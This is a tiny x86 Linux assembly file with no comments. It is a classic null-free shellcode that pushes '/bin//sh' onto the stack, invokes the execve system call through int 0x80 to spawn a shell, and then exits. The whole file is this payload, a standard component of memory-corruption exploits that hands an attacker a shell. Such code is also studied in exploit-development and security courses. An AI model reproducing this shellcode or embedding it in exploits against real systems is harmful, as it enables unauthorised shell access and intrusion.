global _start

section .text
_start:
	xor eax,eax
	push eax
	push dword 0x68732f2f
	push dword 0x6e69622f
	mov ebx,esp
	mov ecx,eax
	mov edx,eax
	mov al,0xb
	int 0x80
	xor eax,eax
	inc eax
	int 0x80


